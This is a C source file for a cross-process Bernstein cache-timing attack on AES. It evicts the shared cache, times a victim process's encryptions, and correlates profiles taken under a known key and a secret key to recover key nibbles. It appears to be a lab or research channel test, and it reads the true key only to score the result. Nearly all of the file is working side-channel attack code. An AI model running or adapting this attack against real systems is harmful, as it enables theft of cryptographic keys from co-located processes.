// attacker_bern.c -- cross-process Bernstein ROUND-1 (channel test).
// Separate process from the victim. For each trace: write a random plaintext to shared
// memory, EVICT the shared cache, set the trigger, and time the round-trip (RDTSC from
// trigger-set to victim clearing it) -- that round-trip contains the victim's AES. It
// builds a reference profile with the victim on a KNOWN key, an attack profile on the
// SECRET key, and correlates them (nibble-sum Bernstein) to recover the 16 top nibbles.
// The key is used ONLY to score the guess (validation), never in recovery.
//
// Build: gcc -O2 -march=native attacker_bern.c -o attacker_bern -lrt
// Run:   taskset -c 2 ./attacker_bern <N1> [evictKB]   (different core from victim!)
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <time.h>
#include <x86intrin.h>
#include "common_bern.h"

static size_t EVSZ=4*1024*1024;   // LLC-sized eviction (cross-core channel)
static uint8_t* evbuf;
static volatile uint64_t esink;
static inline void evict(void){ for(size_t o=0;o<EVSZ;o+=64) esink^=evbuf[o]; }
static uint64_t rng=0x1234567; static inline uint32_t xr(){rng^=rng<<13;rng^=rng>>7;rng^=rng<<17;return (uint32_t)rng;}

static inline uint64_t trigger_timed(BernShared* st){
 unsigned a; _mm_lfence(); uint64_t t0=__rdtscp(&a); _mm_lfence();
 st->trigger=1;
 while(st->trigger) _mm_pause();           // victim clears it when the encryption is done
 _mm_lfence(); uint64_t t1=__rdtscp(&a); _mm_lfence();
 return t1-t0;
}

static double g_sum[16][256],g_cnt[16][256];
static void collect_profile(BernShared* st,int keysel,long N,uint64_t cutoff,double out[16][256]){
 memset(g_sum,0,sizeof g_sum); memset(g_cnt,0,sizeof g_cnt);
 st->keysel=(uint8_t)keysel; __sync_synchronize();
 uint8_t in[16];
 for(long n=0;n<N;n++){
   for(int j=0;j<16;j++){ in[j]=(uint8_t)xr(); st->plaintext[j]=in[j]; }
   evict();
   uint64_t t=trigger_timed(st);
   if(cutoff && t>cutoff) continue;
   for(int i=0;i<16;i++){ g_sum[i][in[i]]+=t; g_cnt[i][in[i]]++; }
 }
 for(int b=0;b<16;b++){ double m=0;int c=0; for(int v=0;v<256;v++) if(g_cnt[b][v]>0){m+=g_sum[b][v]/g_cnt[b][v];c++;} m/=c;
   for(int v=0;v<256;v++) out[b][v]=g_cnt[b][v]>0?(g_sum[b][v]/g_cnt[b][v]-m):0; }
}

static uint64_t measure_min_rt(BernShared* st,int keysel,long K){
 st->keysel=(uint8_t)keysel; __sync_synchronize();
 uint8_t in[16]; uint64_t mn=~0ULL;
 for(long i=0;i<K;i++){ for(int j=0;j<16;j++){in[j]=(uint8_t)xr();st->plaintext[j]=in[j];} evict(); uint64_t t=trigger_timed(st); if(t<mn)mn=t; }
 return mn;
}

int main(int argc,char**argv){
 long N1=(argc>1)?atol(argv[1]):(200L*1000*1000);
 if(argc>2) EVSZ=(size_t)atol(argv[2])*1024;

 int fd=shm_open(SHM_BERN_NAME,O_RDWR,0666);
 if(fd==-1){perror("shm_open (run victim first)");return 1;}
 BernShared* st=mmap(NULL,sizeof(BernShared),PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
 if(st==MAP_FAILED){perror("mmap");return 1;}
 while(!st->ready_v) _mm_pause();

 evbuf=aligned_alloc(4096,EVSZ); memset(evbuf,1,EVSZ);
 rng ^= __rdtsc();

 uint64_t base=measure_min_rt(st,0,100000);
 uint64_t cutoff=base*2;
 printf("[attacker] N1=%ld evict=%zuKB round-trip min=%llu cutoff=%llu\n",
        N1,EVSZ/1024,(unsigned long long)base,(unsigned long long)cutoff); fflush(stdout);

 static double dp[16][256],da[16][256];
 printf("[attacker] building reference profile (victim on known key) ...\n"); fflush(stdout);
 collect_profile(st,0,N1,cutoff,dp);
 printf("[attacker] building attack profile (victim on secret key) ...\n"); fflush(stdout);
 collect_profile(st,1,N1,cutoff,da);

 // nibble-sum Bernstein round-1
 int score=0; uint8_t rec_top[16];
 for(int b=0;b<16;b++){
   double nib[16];
   for(int n=0;n<16;n++){ double s=0; for(int lo=0;lo<16;lo++){ int d=(n<<4)|lo; double c=0;
     for(int v=0;v<256;v++)c+=da[b][v]*dp[b][v^d]; s+=c; } nib[n]=s; }
   int bn=0; for(int n=1;n<16;n++) if(nib[n]>nib[bn])bn=n;
   rec_top[b]=(uint8_t)bn;
   if(rec_top[b]==(st->true_key[b]>>4)) score++;   // VALIDATION ONLY
 }

 printf("[attacker] recovered top nibbles: "); for(int b=0;b<16;b++)printf("%x",rec_top[b]); printf("\n");
 printf("[attacker] true      top nibbles: "); for(int b=0;b<16;b++)printf("%x",st->true_key[b]>>4); printf("\n");
 printf("[attacker] ROUND-1 cross-process: top %d/16\n",score);

 st->exit_flag=1; __sync_synchronize();
 munmap(st,sizeof(BernShared)); close(fd);
 return 0;
}
